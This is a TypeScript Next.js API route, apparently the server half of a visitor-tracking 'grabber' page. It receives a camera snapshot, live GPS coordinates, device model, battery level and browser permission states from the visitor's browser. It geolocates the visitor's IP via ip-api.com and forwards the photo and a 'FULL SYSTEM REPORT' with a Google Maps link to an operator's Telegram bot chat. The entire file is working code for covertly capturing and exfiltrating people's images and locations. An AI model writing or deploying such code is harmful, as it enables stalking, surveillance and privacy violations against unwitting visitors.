import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const { image, gps, device, battery, permissions } = await req.json();
    const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";

    // Info Lokasi IP
    const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    let caption = `🚀 *FULL SYSTEM REPORT*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    // Informasi Jaringan & Lokasi
    caption += `🌐 *NETWORK & GEO*\n`;
    caption += `├ *IP:* \`${geo.query || ip}\` \n`;
    caption += `├ *ISP:* ${geo.isp || "?"}\n`;
    caption += `└ *Lokasi:* ${geo.city || "?"}, ${geo.country || "?"}\n\n`;

    // Detail Perangkat & Baterai
    caption += `📱 *DEVICE DETAILS*\n`;
    caption += `├ *Model:* ${device.model}\n`;
    caption += `├ *OS/Platform:* ${device.os}\n`;
    caption += `├ *Browser:* ${device.browser}\n`;
    caption += `└ *Baterai:* ${battery?.level}% (${battery?.charging ? "⚡ Charging" : "🔋 Discharging"})\n\n`;

    // Laporan Perizinan (Sesuai Gambar Permissions)
    caption += `🛡️ *BROWSER PERMISSIONS*\n`;
    caption += `├ *Kamera/Mic:* ✅ Detected\n`;
    caption += `├ *Lokasi (GPS):* ${permissions.location ? "✅ Granted" : "❌ Denied"}\n`;
    caption += `├ *Notifikasi:* ${permissions.notifications}\n`;
    caption += `├ *Clipboard:* ${permissions.clipboard}\n`;
    caption += `├ *JavaScript:* ✅ Always Allowed\n`;
    caption += `└ *Bluetooth:* ${permissions.nearby}\n\n`;

    if (gps) {
      caption += `🎯 *LIVE GPS:* [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n`;
    }
    
    caption += `\n━━━━━━━━━━━━━━━━━━━━`;

    // Proses Gambar
    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
    const formData = new FormData();
    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
    formData.append("photo", new Blob([buffer], { type: "image/png" }), "capture.png");
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");

    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  }
}